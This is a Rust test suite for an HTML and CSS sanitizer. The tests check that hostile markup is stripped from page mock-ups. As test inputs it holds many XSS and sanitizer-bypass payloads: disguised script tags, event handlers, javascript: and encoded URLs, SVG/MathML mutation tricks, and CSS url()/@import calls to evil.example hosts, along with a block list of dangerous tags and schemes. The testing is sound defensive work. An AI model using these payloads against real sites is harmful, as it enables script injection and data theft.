//! The cleaner against a hostile mock-up. Every test asks the same two questions of the result:
//! is what should stay still there, and can anything that runs or loads be read out of it.

use super::*;

/// Nothing in a cleaned page may be read as one of these, however it was disguised going in.
fn assert_inert(out: &str) {
    let low = out.to_ascii_lowercase();
    for bad in ["<script", "<iframe", "<object", "<embed", "<link", "<base", "<meta", "<frame", "<applet", "<template", "<noscript",
        "<audio", "<video", "<math", "<foreignobject", "<use", "<image", "<animate", "<set ", "javascript:", "vbscript:", "http:", "https:", "ftp:", "//evil",
        "srcdoc", "srcset", "action=", "formaction", "xlink", "@import", "expression(", "-moz-binding", "http-equiv", "<!--", "<?", "<!doctype"] {
        assert!(!low.contains(bad), "{bad:?} survived in: {out}");
    }
    // No attribute that starts with `on` (an event handler), whatever follows.
    // (Attribute values are always written in double quotes with `"` escaped, so they can be blanked first.)
    let bare = regex::Regex::new(r#""[^"]*""#).unwrap().replace_all(out, "\"\"");
    let re = regex::Regex::new(r#"(?i)<[a-z][^>]*\son[a-z]*\s*="#).unwrap();
    assert!(!re.is_match(&bare), "an event handler survived in: {out}");
    // Any address left in an attribute is an embedded picture or a link within the page.
    for m in regex::Regex::new(r#"(?i)\s(src|href)="([^"]*)""#).unwrap().captures_iter(out) {
        let v = &m[2];
        assert!(v.starts_with('#') || v.to_ascii_lowercase().starts_with("data:image/"), "address {v:?} survived in: {out}");
    }
    // Any url() left in the CSS is an embedded picture.
    let flat = css_flat(&out.replace("&quot;", "\"").replace("&amp;", "&"));
    for (at, _) in flat.match_indices("url(") {
        let rest = flat[at + 4..].trim_start_matches(['"', '\'']);
        // (`url(#shade)` is a drawing pointing at its own gradient.)
        assert!(rest.starts_with("data:image/") || rest.starts_with('#'), "url() survived in: {out}");
    }
    // What the window receives is always the same shape: style blocks, then one body.
    assert!(out.ends_with("</body>") && out.matches("<body").count() == 1 && out.matches("</body>").count() == 1, "{out}");
    assert!(!low.contains("<html") && !low.contains("<head"), "{out}");
}

fn cleaned(html: &str) -> String {
    let out = clean(html).unwrap_or_else(|why| panic!("refused ({why:?}): {html}"));
    assert_inert(&out);
    // Cleaning what is already clean changes nothing: the output is stable when read again.
    assert_eq!(clean(&out).unwrap(), out, "not stable for: {html}");
    out
}

const PNG: &str = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";

#[test]
fn an_ordinary_mock_up_keeps_its_layout() {
    let out = cleaned(&format!(r##"<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8"><title>Sign in</title>
        <style>.card {{ background: var(--mado-color-surface); border-radius: var(--mado-radius); padding: calc(var(--mado-spacing) * 2) }}
        @media (max-width: 600px) {{ .card {{ padding: 8px }} }}
        .logo {{ background-image: url("{PNG}") }}</style></head>
        <body class="page" style="margin:0; font-family: var(--mado-font-body)">
        <main class="card" id="sign-in" data-screen="sign-in" aria-label="Sign in">
          <h1>مرحباً &amp; welcome</h1><p>Use your <b>email</b>.<br>Thanks</p>
          <form action="https://evil.example/steal" method="post"><label for="e">Email</label>
            <input id="e" type="email" placeholder="you@example.com" value="a&quot;b"><input type="checkbox" checked>
            <select><option selected>One</option></select><textarea rows="3">x &lt; y</textarea>
            <button type="submit" class="primary" disabled>Sign in</button></form>
          <img src="{PNG}" alt="Logo" width="40" height="40"><a href="#help">Help</a>
          <table><thead><tr><th scope="col" colspan="2">Name</th></tr></thead><tbody><tr><td>Sara</td><td>Admin</td></tr></tbody></table>
          <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2"><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs><path d="M5 12h14M12 5l7 7-7 7" fill="url(#g)"/><circle cx="12" cy="12" r="3"/></svg>
        </main></body></html>"##));
    for kept in ["<style>", "var(--mado-color-surface)", "@media (max-width: 600px)", &format!("url(\"{PNG}\")"), r#"<body class="page" style="margin:0; font-family: var(--mado-font-body)" lang="ar" dir="rtl">"#,
        r#"<main class="card" id="sign-in" data-screen="sign-in" aria-label="Sign in">"#, "<h1>مرحباً &amp; welcome</h1>", "<b>email</b>.<br>Thanks", "<form>", r#"<label for="e">"#,
        r#"<input id="e" type="email" placeholder="you@example.com" value="a&quot;b">"#, r#"<input type="checkbox" checked="">"#, r#"<option selected="">One</option>"#,
        r#"<textarea rows="3">x &lt; y</textarea>"#, r#"<button class="primary" disabled="" type="button">Sign in</button>"#, &format!(r#"<img src="{PNG}" alt="Logo" width="40" height="40">"#),
        r##"<a href="#help">Help</a>"##, r#"<th scope="col" colspan="2">Name</th>"#, r#"<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2">"#,
        r##"<linearGradient id="g"><stop offset="0" stop-color="#fff"></stop></linearGradient>"##, r##"<path d="M5 12h14M12 5l7 7-7 7" fill="url(#g)"></path>"##, r#"<circle cx="12" cy="12" r="3"></circle>"#] {
        assert!(out.contains(kept), "{kept} is missing from: {out}");
    }
    assert!(!out.contains("Sign in</title>") && !out.contains("evil") && !out.contains("method"));
}

#[test]
fn scripts_go_in_every_disguise() {
    for html in [
        "<script>alert(1)</script><p>ok</p>",
        "<SCRIPT SRC=//evil/x.js></SCRIPT><p>ok</p>",
        "<scr<script>ipt>alert(1)</scr</script>ipt><p>ok</p>",
        "<p>ok</p><script\n>alert(1)</script\t>",
        "<script/src=data:text/javascript,alert(1)></script><p>ok</p>",
        "<p>ok<script>alert(1)",
        "<svg><script>alert(1)</script></svg><p>ok</p>",
        "<svg><script href=//evil/x.js /><p>ok</p>",
        "<svg><g><script xlink:href='data:,alert(1)'></script></g></svg><p>ok</p>",
        "<math><mtext><script>alert(1)</script></mtext></math><p>ok</p>",
        "<math><mi xlink:href='javascript:alert(1)'>x</mi></math><p>ok</p>",
        "<table><script>alert(1)</script><tr><td><p>ok</p></td></tr></table>",
        "<select><script>alert(1)</script></select><p>ok</p>",
        "<template><script>alert(1)</script></template><p>ok</p>",
        "<noscript><script>alert(1)</script></noscript><p>ok</p>",
        "<head><script>alert(1)</script></head><body><p>ok</p>",
        "<p>ok</p></body></html><script>alert(1)</script>",
        "<p>ok</p><!--><script>alert(1)</script>-->",
        "<![CDATA[<script>alert(1)</script>]]><p>ok</p>",
        "<?xml version='1.0'?><?xml-stylesheet href='//evil/x.xsl'?><p>ok</p>",
        "<p>ok</p>\u{0}<scr\u{0}ipt>alert(1)</script>",
    ] {
        let out = cleaned(html);
        assert!(out.contains("ok"), "{html} → {out}");
        // What a script held may survive only as words inside text that was opened up, never as an element.
        assert!(!out.contains("<script"), "{html} → {out}");
    }
    // The body of a script is gone with it, not left as text.
    assert_eq!(cleaned("<p>a</p><script>alert(1)</script><p>b</p>"), "<body><p>a</p><p>b</p></body>");
    assert_eq!(cleaned("<svg><script>alert(1)</script><circle r=1 /></svg>"), "<body><svg><circle r=\"1\"></circle></svg></body>");
}

#[test]
fn event_handlers_go_whatever_they_hang_on() {
    for html in [
        "<img src=x onerror=alert(1)><p>ok</p>",
        "<p onclick='alert(1)' ONMOUSEOVER=\"alert(2)\">ok</p>",
        "<body onload=alert(1)><p>ok</p>",
        "<svg onload=alert(1)><circle r=1 onclick=alert(2) /></svg><p>ok</p>",
        "<details open ontoggle=alert(1)><summary>ok</summary></details>",
        "<input autofocus onfocus=alert(1)><p>ok</p>",
        "<div on=x onx=y on-click=z \u{0}onclick=q>ok</div>",
        "<p/onclick=alert(1)>ok</p>",
        "<p x=\"\"onclick=alert(1)>ok</p>",
        "<p style=\"\" onpointerenter\n=\nalert(1)>ok</p>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s /></svg><p>ok</p>",
        "<marquee onstart=alert(1)>x</marquee><p>ok</p>",
    ] {
        let out = cleaned(html);
        assert!(out.contains("ok") && !out.to_ascii_lowercase().contains("alert"), "{html} → {out}");
    }
    // Attributes nobody listed do not come through either, harmless or not.
    assert_eq!(cleaned("<p draggable=true contenteditable tabindex=0 accesskey=x is=evil-el>ok</p>"), "<body><p>ok</p></body>");
    assert_eq!(cleaned("<input autofocus formaction=//evil type=image src=//evil/x.png>"), "<body><input type=\"text\"></body>");
}

#[test]
fn addresses_go_unless_they_are_embedded_pictures() {
    for html in [
        "<a href='javascript:alert(1)'>ok</a>",
        "<a href='&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)'>ok</a>",
        "<a href='&#x6A;avascript:alert(1)'>ok</a>",
        "<a href=' \tjava\nscript\r:alert(1)'>ok</a>",
        "<a href='\u{1}javascript:alert(1)'>ok</a>",
        "<a href='JaVaScRiPt:alert(1)'>ok</a>",
        "<a href='https://evil.example/'>ok</a>",
        "<a href='//evil.example/'>ok</a>",
        "<a href='data:text/html,<script>alert(1)</script>'>ok</a>",
        "<a href='#x' ping='https://evil.example/' target=_top>ok</a>",
        "<img src='https://evil.example/pixel.gif'>ok",
        "<img src='data:text/html;base64,PHNjcmlwdD4='>ok",
        "<img src='data:image/svg+xml;base64,PHN2Zz4=' srcset='https://evil.example/2x.png 2x'>ok",
        "<img src='data:image/png;base64,AAAA' lowsrc=//evil dynsrc=//evil longdesc=//evil usemap=#m>ok",
        "<img src=' DATA:IMAGE/PNG;base64,AAAA '>ok",
        "<img src='data:image/png,x' background='//evil/x.png'>ok<table background='//evil/x.png'><tr><td>t</td></tr></table>",
        "<input type=image src=//evil/x.png>ok",
        "<video src=//evil/x.mp4 poster=//evil/x.png></video><audio src=//evil/x.mp3></audio>ok",
        "<picture><source srcset=//evil/x.png><img src=//evil/y.png></picture>ok",
        "<object data='//evil/x.swf'></object><embed src='//evil/x.swf'>ok",
        "<blockquote cite='//evil/x'>ok</blockquote><q cite=//evil/y>q</q>",
        "<form action='javascript:alert(1)'><button formaction='//evil/x'>ok</button></form>",
        "<svg><a xlink:href='javascript:alert(1)'><text>ok</text></a><image href='//evil/x.png' /><use href='//evil/x.svg#a' /></svg>ok",
        "<svg><path d='M0 0' fill='url(//evil/x.svg#p)' stroke='url(https://evil/x)' clip-path='url(  //evil )' /></svg>ok",
    ] {
        let out = cleaned(html);
        assert!(out.contains("ok"), "{html} → {out}");
        assert!(!out.contains("evil") && !out.contains("alert"), "{html} → {out}");
    }
    // The kinds of embedded picture that stay, and a link within the page.
    for kind in ["png", "jpeg", "gif", "webp", "svg+xml"] {
        let src = format!("data:image/{kind};base64,AAAA");
        assert_eq!(cleaned(&format!("<img src='{src}'>")), format!("<body><img src=\"{src}\"></body>"));
    }
    assert!(is_data_image("data:image/svg+xml;charset=utf-8,%3Csvg/%3E") && is_data_image("data:image/png,xx"));
    for not in ["data:image/bmp;base64,AA", "data:image/svg+xml", "data:image/png;base64", "data:text/html,x", "data:image/png;x=<y>,z", "data:,x", "image/png;base64,AA", "data:image/pngx,AA"] {
        assert!(!is_data_image(not), "{not}");
    }
    assert!(!is_data_image(&format!("data:image/png;base64,{}", "A".repeat(MAX_DATA_URL))), "an embedded picture has a size limit");
    assert_eq!(cleaned("<a href='#top'>t</a><a href='#'>h</a><a href='#a b'>s</a>"), "<body><a href=\"#top\">t</a><a href=\"#\">h</a><a>s</a></body>");
}

#[test]
fn what_redirects_frames_or_rebases_goes() {
    for html in [
        "<meta http-equiv='refresh' content='0;url=https://evil.example/'><p>ok</p>",
        "<p>ok</p><meta http-equiv=\"Content-Security-Policy\" content=\"default-src *; script-src 'unsafe-inline'\">",
        "<base href='https://evil.example/'><p>ok</p><base target=_top>",
        "<link rel=stylesheet href='https://evil.example/x.css'><link rel=preload as=image href=//evil/x><p>ok</p>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe><p>ok</p>",
        "<iframe src='javascript:alert(1)'></iframe><frameset><frame src=//evil></frameset><p>ok</p>",
        "<p>ok</p><iframe srcdoc=\"&lt;img src=x onerror=alert(1)&gt;\">",
        "<object type='text/html' data='data:text/html,<script>alert(1)</script>'><p>ok</p></object><p>ok</p>",
        "<embed type='image/svg+xml' src='data:image/svg+xml,<svg onload=alert(1)>'><p>ok</p>",
        "<applet code=Evil.class></applet><portal src=//evil></portal><p>ok</p>",
        "<p>ok</p><title><script>alert(1)</script></title><xmp><script>alert(1)</script></xmp><plaintext><script>alert(1)",
        "<p>ok</p><noembed><script>alert(1)</script></noembed><noframes><script>alert(1)</script></noframes>",
    ] {
        let out = cleaned(html);
        assert!(out.contains("<p>ok</p>") && !out.contains("alert") && !out.contains("evil"), "{html} → {out}");
    }
}

#[test]
fn foreign_content_cannot_smuggle_markup() {
    for html in [
        // Text that would become markup if it were written back without escaping.
        "<svg><title><![CDATA[</title><script>alert(1)</script>]]></title></svg><p>ok</p>",
        "<svg><desc><p><style><img src=x onerror=alert(1)></style></p></desc></svg><p>ok</p>",
        "<svg><foreignObject><iframe srcdoc='<script>alert(1)</script>'></iframe><div onclick=alert(1)>x</div></foreignObject></svg><p>ok</p>",
        "<svg><style>*{background:url(//evil/x)}</style><text>t</text></svg><p>ok</p>",
        "<svg><style><!--</style><img src=x onerror=alert(1)>--></style></svg><p>ok</p>",
        "<math><annotation-xml encoding='text/html'><script>alert(1)</script><img src=x onerror=alert(1)></annotation-xml></math><p>ok</p>",
        "<math><mtext><table><mglyph><style><!--</style><img title='--&gt;&lt;img src=1 onerror=alert(1)&gt;'>",
        "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
        "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">ok</p>",
        "<textarea><script>alert(1)</script></textarea><p>ok</p>",
        "<p title='</p><script>alert(1)</script>'>ok</p>",
        "<style></style><p id=\"</style><script>alert(1)</script>\">ok</p>",
        "<div><svg><set attributeName=onmouseover to=alert(1) /><animate attributeName=href values=javascript:alert(1) /></svg>ok</div>",
        "<p>ok</p><svg><svg><svg><g><g><g><foreignObject><math><mi><svg><script>alert(1)</script></svg></mi></math></foreignObject></g></g></g></svg></svg></svg>",
    ] {
        let out = cleaned(html);
        // Whatever stayed is text or an attribute's words: it never became an element or a handler again.
        assert!(!out.contains("<img src=\"x\"") && !out.contains("<img src=\"1\""), "{html} → {out}");
    }
    assert_eq!(cleaned("<textarea><script>alert(1)</script></textarea>"), "<body><textarea>&lt;script&gt;alert(1)&lt;/script&gt;</textarea></body>");
    assert_eq!(cleaned("<p title='</p><script>alert(1)</script>'>ok</p>"), "<body><p title=\"&lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt;\">ok</p></body>");
    // A drawing keeps its shapes and loses everything else, HTML inside it included.
    assert_eq!(cleaned("<svg><g><foreignObject><p>html</p></foreignObject><rect width=1 height=1 /></g><use href=#a /></svg>"),
        "<body><svg><g><rect width=\"1\" height=\"1\"></rect></g></svg></body>");
    // Shapes outside a drawing are not drawn.
    assert_eq!(cleaned("<div><path d='M0 0'></path>x</div>"), "<body><div>x</div></body>");
}

#[test]
fn css_that_loads_or_runs_goes_and_the_rest_stays_as_written() {
    let sheet = |css: &str| clean_css(css, true);
    let decls = |css: &str| clean_css(css, false);
    // Kept exactly as written.
    for css in [
        ".a { color: red; margin: 0 auto }",
        "@media (min-width: 600px) and (prefers-color-scheme: dark) { .a > .b:hover::before { content: \"→ ;}{\"; inset: calc(1px + 2%) } }",
        "@keyframes spin { from { transform: rotate(0) } to { transform: rotate(360deg) } }",
        ":root{--x: #fff;--y:var(--mado-color-bg, #000)}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr))}",
        ".a { background: linear-gradient(90deg, rgba(0,0,0,.2), transparent), url(data:image/png;base64,AAAA) }",
        ".a { background: URL( \"data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg'/%3E\" ) }",
        ".a { scroll-behavior: smooth; overscroll-behavior: contain }",
        "@supports (display: grid) { .a { .b & { color: blue } } }",
        "a[href^='#'] { color: red }",
    ] {
        assert_eq!(sheet(css), css, "{css}");
    }
    // The forbidden rule or declaration goes whole; its neighbours stay.
    for (css, want) in [
        ("@import url(//evil/x.css); .a{color:red}", " .a{color:red}"),
        ("@import '//evil/x.css'; .a{color:red}", " .a{color:red}"),
        ("@IMPORT \"//evil/x.css\" screen;.a{color:red}", ".a{color:red}"),
        ("@\\69mport url(//evil/x.css);.a{color:red}", ".a{color:red}"),
        ("@im\\70 ort '//evil';.a{color:red}", ".a{color:red}"),
        ("@import/**/'//evil';.a{color:red}", ".a{color:red}"),
        (".a{color:red;background:url(//evil/x.png);margin:0}", ".a{color:red;margin:0}"),
        (".a{color:red;background:url( 'https://evil/x.png' )}", ".a{color:red;}"),
        (".a{background:\\75rl(//evil/x.png);color:red}", ".a{color:red}"),
        (".a{background:\\75 rl(//evil/x.png);color:red}", ".a{color:red}"),
        (".a{background:\\000075\\72\\6c(//evil/x.png);color:red}", ".a{color:red}"),
        (".a{background:u\\rl(//evil/x.png);color:red}", ".a{color:red}"),
        (".a{background:URL(//evil/x.png);color:red}", ".a{color:red}"),
        (".a{background:url(\"//evil/x.png\");color:red}", ".a{color:red}"),
        (".a{background:url/**/(//evil/x.png);color:red}", ""), // not a url() to a browser, but the second look takes no chances: the whole sheet goes
        (".a{background:image-set('//evil/x.png' 1x);color:red}", ".a{color:red}"),
        (".a{background:-webkit-image-set(url(//evil/x.png) 1x);color:red}", ".a{color:red}"),
        (".a{background:image('//evil/x.png');color:red}", ".a{color:red}"),
        (".a{width:expression(alert(1));color:red}", ".a{color:red}"),
        (".a{width:EXPRESSION(alert(1));color:red}", ".a{color:red}"),
        (".a{width:e\\78pression(alert(1));color:red}", ".a{color:red}"),
        (".a{-moz-binding:url(//evil/x.xml#b);color:red}", ".a{color:red}"),
        (".a{-moz-binding:none;color:red}", ".a{color:red}"),
        (".a{behavior:url(x.htc);color:red}", ".a{color:red}"),
        (".a{BEHAVIOR:none;color:red}", ".a{color:red}"),
        (".a{--x:url(//evil/x.png);color:red}", ".a{color:red}"),
        (".a{background:url(data:text/html,x);color:red}", ".a{color:red}"),
        (".a{background:url(data:image/png;base64,AA) , url(//evil/y);color:red}", ".a{color:red}"),
        (".a{background:url(\"data:image/png;base64,AA\" x);color:red}", ".a{color:red}"),
        (".a{background:url('//evil/x.png\n');color:red}", ".a{}"), // a broken string swallows to the end of the block, as in a browser
        ("@font-face{font-family:x;src:url(//evil/x.woff)}.a{color:red}", ".a{color:red}"),
        ("@font-face{font-family:x;src:url(data:font/woff2;base64,AA)}.a{color:red}", ".a{color:red}"),
        ("@namespace svg url(http://www.w3.org/2000/svg);.a{color:red}", ".a{color:red}"),
        ("@media screen{@import '//evil';.a{background:url(//evil)}.b{color:red}}", "@media screen{.a{}.b{color:red}}"),
        ("@document url(//evil){.a{color:red}}.b{color:red}", ".b{color:red}"),
        (".a{color:red}}.b{background:url(//evil)}.c{color:red}", ".a{color:red}.c{color:red}"),
        (".a{cursor:url(//evil/c.cur),auto;list-style:url(//evil/l.png);color:red}", ".a{color:red}"),
        (".a{content:url(//evil/x);mask:url(//evil/m.svg#m);filter:url(//evil/f.svg#f);color:red}", ".a{color:red}"),
        (".a{background:src('//evil/x.png');color:red}", ".a{color:red}"),
        (".a{background:element(#x);color:red}", ".a{color:red}"),
    ] {
        assert_eq!(sheet(css), want, "{css}");
    }
    // An unclosed thing never lets the rest through.
    for css in [".a{background:url(//evil/x", ".a{background:url('//evil/x", "@import '//evil/x", ".a{background:url(//evil/x) /*", "@import url(//evil/x.css)", ".a{color:red;background:url(//ev\\", "/*/ @import '//evil'; /*/@import '//evil2';"] {
        let out = sheet(css);
        assert!(!out.contains("evil"), "{css} → {out}");
    }
    // A style attribute: declarations only.
    assert_eq!(decls("color: red; background: url(//evil/x.png); margin: 0"), "color: red; margin: 0");
    assert_eq!(decls("color:red;background:\\75rl(javascript:alert(1))"), "color:red;");
    assert_eq!(decls("color:red} .x{background:url(//evil)"), "");
    assert_eq!(decls("color:red; .x{color:blue} margin:0"), "color:red; margin:0");
    assert_eq!(decls("width: expression(alert(1))"), "");
    assert_eq!(decls("background: url(data:image/gif;base64,AA) no-repeat"), "background: url(data:image/gif;base64,AA) no-repeat");
    // The text can never close the <style> element it sits in, and line ends are made one kind.
    assert_eq!(sheet(".a::after{content:'</style><script>alert(1)</script>'}"), "");
    assert_eq!(sheet(".a{color:red}\r\n.b{color:blue}\r"), ".a{color:red}\n.b{color:blue}\n");
    // Rules nested without end are cut, not followed.
    let deep = format!("{}color:red{}", "@media screen{".repeat(5000), "}".repeat(5000));
    assert!(sheet(&deep).len() < 400);
    let deep = format!(".a{{width:calc{}1{}}}", "(".repeat(100_000), ")".repeat(100_000));
    assert_eq!(sheet(&deep), deep);
}

#[test]
fn css_inside_a_page_is_filtered_where_it_stands() {
    let out = cleaned("<style>@import '//evil/a.css'; body { background: url(//evil/b.png); color: red }</style>\
        <p style='color: blue; background: url(//evil/c.png)'>ok</p>\
        <style media='print' onload='alert(1)'>.x { behavior: url(evil.htc); margin: 0 }</style>\
        <div style='background-image: \\75\\72\\6c(//evil/d.png)'>d</div><b style='x:expression(alert(1))'>b</b>");
    assert_eq!(out, "<style> body { color: red }</style><style>.x { margin: 0 }</style><body><p style=\"color: blue;\">ok</p><div>d</div><b>b</b></body>");
    // A style sheet cannot end early and continue as markup.
    let out = cleaned("<style>.a{color:red}</style><script>alert(1)</script><style>.b{content:\"</style><img src=x onerror=alert(1)>\"}</style>");
    assert!(!out.contains("<img") || out.contains("<img>"), "{out}");
    // Entities in an attribute are undone before the CSS is read.
    assert_eq!(cleaned("<p style='background:&#117;rl(//evil/x)'>ok</p>"), "<body><p>ok</p></body>");
    assert_eq!(cleaned("<p style='background:url(&quot;//evil/x&quot;);color:red'>ok</p>"), "<body><p style=\"color:red\">ok</p></body>");
}

#[test]
fn size_and_depth_have_limits() {
    // Deep, but a page a person could have written: cut at a depth, not refused, and dropped without a deep recursion.
    let out = cleaned(&format!("{}x", "<div>".repeat(MAX_OPEN - 10)));
    assert_eq!(out.matches("<div>").count(), MAX_DEPTH);
    assert!(cleaned(&format!("{}x", "<svg><g>".repeat(400))).matches("<g>").count() <= MAX_DEPTH);
    // Very many elements: the page is cut, not refused.
    let wide = "<i>x</i>".repeat(MAX_ELEMENTS + 5_000);
    assert_eq!(cleaned(&wide).matches("<i>").count(), MAX_ELEMENTS);
    // Elements that are closed, or need no closing tag, are not "open": a long page is fine.
    let long = format!("{}<ul>{}</ul><p>last</p>", "<div><br><img>x</div>".repeat(3_000), "<li>item".repeat(3_000));
    assert!(cleaned(&long).contains("<p>last</p>"));
    // Long attribute values are left out.
    let out = cleaned(&format!("<p title='{}' class='c'>ok</p>", "t".repeat(MAX_ATTR + 1)));
    assert_eq!(out, "<body><p class=\"c\">ok</p></body>");
    assert_eq!(cleaned(&format!("<p style='color:red;{}'>ok</p>", " ".repeat(MAX_STYLE_ATTR))), "<body><p>ok</p></body>");
    // Many attributes, under the limit; quoted values full of spaces and `>` are one attribute each.
    let some: String = (0..MAX_ATTRS).map(|i| format!("data-a{i}=1 ")).collect();
    assert!(cleaned(&format!("<p {some}>shown</p>")).contains(">shown</p>"));
    assert!(cleaned(&format!("<p class=\"{}\" title = '{}'>shown</p>", "a b ".repeat(2_000), "> x ".repeat(400))).contains(">shown</p>"));
}

#[test]
fn a_page_past_a_limit_is_refused_while_it_is_read() {
    // The limits are counted by the parser's own calls, so no way of writing a tag gets around them.
    for (why, html) in [
        (Refused::TooDeep, "<div>".repeat(80_000)),
        (Refused::TooDeep, format!("<p>first</p>{}", "<span>".repeat(MAX_OPEN + 5))),
        (Refused::TooDeep, "<template>".repeat(40_000)),
        (Refused::TooDeep, "<svg><g>".repeat(30_000)),
        (Refused::TooDeep, "<b><i><u>".repeat(44_000)),
        (Refused::TooDeep, "<table><td>".repeat(36_000)),
        // Tags a text scan would misjudge: a `>` inside a quoted value, a quote that opens nothing, upper case, a slash.
        (Refused::TooDeep, "<div title=\">\">".repeat(MAX_OPEN + 5)),
        (Refused::TooDeep, "<div a=b\"c>".repeat(MAX_OPEN + 5)),
        (Refused::TooDeep, "<DIV\n/x>".repeat(MAX_OPEN + 5)),
        (Refused::TooDeep, "<x<b>".repeat(MAX_OPEN + 5)),
        (Refused::TooMany, "<i>x</i>".repeat(MAX_CREATED + 5)),
        (Refused::TooMany, "<br>".repeat(MAX_CREATED + 5)),
        (Refused::TooManyAttributes, format!("<p {}>x</p>", (0..MAX_ATTRS + 5).map(|i| format!("a{i}=1 ")).collect::<String>())),
        (Refused::TooManyAttributes, format!("<p {}>x</p>", (0..MAX_ATTRS + 5).map(|i| format!("a{i}=\"> <p \"\n")).collect::<String>())),
        (Refused::TooManyAttributes, format!("<svg><path {}/></svg>", (0..MAX_ATTRS + 5).map(|i| format!("A{i} ")).collect::<String>())),
    ] {
        let t = std::time::Instant::now();
        assert_eq!(clean(&html), Err(why), "{}…", &html[..40]);
        assert!(t.elapsed() < std::time::Duration::from_secs(5), "{:?} for {}…", t.elapsed(), &html[..40]);
    }
    // The clock: with no time at all, any page of more than one piece is refused.
    assert_eq!(clean_within(&"<p>x</p>".repeat(1_000), std::time::Duration::ZERO), Err(Refused::TooSlow));
    assert!(clean_within("<p>x</p>", std::time::Duration::ZERO).is_ok());
}

#[test]
fn a_style_sheet_can_never_close_its_element_or_open_a_comment() {
    let sheet = |css: &str| clean_css(css, true);
    // Each of these re-forms `</style>` or `<!--` when one replacement is done before another.
    for css in [
        ".a{content:'<<!--/style><script>alert(1)</script>'}",
        ".a{content:'<<!--<!--/style>'}",
        ".a{content:'<<!<!----/style>'}",
        ".a{content:'<--><!--/style>'}",
        ".a{content:'<-<!--->/style>'}",
        ".a{content:'<<!---->/style>'}",
        ".a{content:'<<!--\\/style>'}",
        ".a{content:'<!<!----'}",
        ".a{content:'<!-<!--- x'}",
        ".a{content:'</STYLE>'}",
        ".a{content:'<\\/style>'}",
        ".a{content:'<!doctype html>'}",
        ".a{content:'<![CDATA['}",
        "<!-- .a{color:red} -->",
        "</style><script>alert(1)</script>",
    ] {
        let out = sheet(css);
        let low = out.to_ascii_lowercase();
        assert!(!low.contains("</") && !low.contains("<!") && !low.contains("-->"), "{css} → {out}");
        // And inside a page: the result holds exactly the style element and the body, nothing more.
        let page = cleaned(&format!("<style>{}</style><p>ok</p>", css.replace("</style>", "").replace("</STYLE>", "")));
        assert!(page.ends_with("<body><p>ok</p></body>") && !page.contains("<script") && !page.contains("alert"), "{css} → {page}");
        assert_eq!(page.matches("</style>").count(), page.matches("<style>").count(), "{css} → {page}");
    }
    // The ordinary case still reads as it was written, with only the `/` escaped.
    assert_eq!(sheet(".a::after{content:'</b>'}"), ".a::after{content:'<\\/b>'}");
    assert_eq!(sheet(".a{content:'a < b'}"), ".a{content:'a < b'}");
}

#[test]
fn nothing_and_nonsense_give_an_empty_page() {
    assert_eq!(cleaned(""), "<body></body>");
    assert_eq!(cleaned("\u{feff}  "), "<body></body>");
    assert_eq!(cleaned("just words & <signs>"), "<body>just words &amp; </body>");
    assert_eq!(cleaned("<<<>>>"), "<body>&lt;&lt;&lt;&gt;&gt;&gt;</body>");
    assert_eq!(cleaned("<frameset><frame src=//evil></frameset>"), "<body></body>");
    assert_eq!(cleaned("<body class=a><body class=b id=x onload=alert(1)><p>ok"), "<body class=\"a\" id=\"x\"><p>ok</p></body>");
    assert_eq!(cleaned("<html dir=RTL lang=ar onclick=alert(1)><body dir=ltr>x"), "<body dir=\"ltr\" lang=\"ar\">x</body>");
    assert_eq!(cleaned("<custom-card><font color=red><center>ok</center></font></custom-card>"), "<body>ok</body>");
}

#[test]
fn a_large_hostile_page_is_dealt_with_in_bounded_time() {
    // Each of these is as large as a mock-up may be (400 kB). Cleaned or refused, never slow:
    // the bound is the clock's two seconds plus room for a debug build.
    for (name, html) in [
        ("deep", "<div>".repeat(80_000)), ("wide", "<i>x</i>".repeat(50_000)), ("templates", "<template>".repeat(40_000)),
        ("drawing", "<svg><g>".repeat(50_000)), ("formatting", "<b><i><u>".repeat(44_000)), ("tables", "<table><td>".repeat(36_000)),
        ("attrs", format!("<p {}>", (0..40_000).map(|i| format!("a{i}=1 ")).collect::<String>())),
        ("same attrs", format!("<p {}>", "a=1 ".repeat(100_000))),
        ("css", format!("<style>{}</style>", ".a{color:red}".repeat(30_000))), ("brackets", format!("<p style='{}'>", "(".repeat(390_000))),
        ("entities", "&amp;&lt;&#x41;&notanentity;".repeat(14_000)), ("comments", "<!-- x --><!x><?y>".repeat(22_000)),
        ("p in p", "<p><table><p>".repeat(30_000)), ("misnested", "<b><p></b></p>".repeat(28_000)), ("selects", "<select><option>".repeat(25_000)),
        ("fostered", "<table><div>".repeat(33_000)), ("unclosed quote", format!("<p title=\"{}", "<div>".repeat(79_000))),
    ] {
        let t = std::time::Instant::now();
        let out = clean(&html);
        let took = t.elapsed();
        eprintln!("{name}: {took:?}, {:?}", out.as_ref().map(|o| o.len()));
        assert!(took < std::time::Duration::from_secs(6), "{name} took {took:?}");
    }
}
